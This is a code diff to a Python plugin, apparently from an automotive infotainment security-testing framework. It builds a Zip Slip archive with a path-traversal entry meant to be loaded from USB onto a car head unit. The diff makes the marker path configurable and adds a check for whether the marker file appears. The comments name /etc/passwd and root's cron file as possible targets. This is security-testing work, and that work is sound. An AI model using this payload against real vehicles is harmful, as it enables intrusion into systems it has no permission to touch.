@@ -15,7 +15,18 @@ import shutil
 from iv_plugin_base import IVIVulnerabilityPlugin
 
 class UsbPathTraversalPlugin(IVIVulnerabilityPlugin):
+    meta_poc_name = "USB Path Injection"
+    meta_cve_id = "N/A"
+    meta_severity = "Medium"
+    meta_protocol = "unknown"
+    meta_target_os = ["all"]
+    meta_required_params = []
+    is_disruptive = False
+    meta_destructive_level = "Safe"
+
     def check_prerequisites(self):
+        self.marker_path = self.params.get("marker_path", "/tmp/pwned_by_zip_slip")
+        self.observe_seconds = float(self.params.get("observe_seconds", 5))
         return True
 
     def exploit(self):
@@ -37,7 +48,8 @@ class UsbPathTraversalPlugin(IVIVulnerabilityPlugin):
             
             # 这是一个典型的 Zip Slip 漏洞攻击包
             # 我们将写入一个文件名为 "../../../../../../../etc/passwd" 或 "/var/spool/cron/root" 的条目
-            malicious_entry = "../../../../../../../../tmp/pwned_by_zip_slip"
+            escaped_target = self.marker_path.lstrip("/")
+            malicious_entry = "../../../../../../../../" + escaped_target
             
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
                 # 写入恶意条目
@@ -49,12 +61,19 @@ class UsbPathTraversalPlugin(IVIVulnerabilityPlugin):
             self.logger.warning(f"[SUCCESS] 恶意 Zip Slip 更新包已在本地生成！")
             self.logger.warning(f"  绝对路径: {zip_path}")
             self.logger.warning("[!] 请将此包拷入U盘。当车机尝试读取此ZIP进行OTA、壁纸更新或日志导入时：")
-            self.logger.warning(f"    系统将灾难性地把木马文件释放到车机的 /tmp/pwned_by_zip_slip ! ")
+            self.logger.warning(f"    系统将灾难性地把木马文件释放到车机的 {self.marker_path} ! ")
+            time.sleep(self.observe_seconds)
+            if os.path.exists(self.marker_path):
+                return {
+                    "status": "success",
+                    "vulnerable": True,
+                    "details": f"Observed path-traversal marker file at {self.marker_path} after processing malicious ZIP."
+                }
             
             return {
                 "status": "success",
-                "vulnerable": True,
-                "details": f"Generated malicious ZIP Slip payload at {zip_path}. Awaiting manual testing."
+                "vulnerable": False,
+                "details": f"已生成 ZIP Slip 样本 {zip_path}，但未在 {self.marker_path} 观察到自动化路径逃逸证据。"
             }
 
         except Exception as e:
@@ -62,8 +81,5 @@ class UsbPathTraversalPlugin(IVIVulnerabilityPlugin):
             return {"status": "error", "details": str(e)}
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage: python3 57_USB_Path_Injection.py")
-        sys.exit(1)
-    plugin = UsbPathTraversalPlugin()
+    plugin = UsbPathTraversalPlugin({})
     plugin.run_verify()
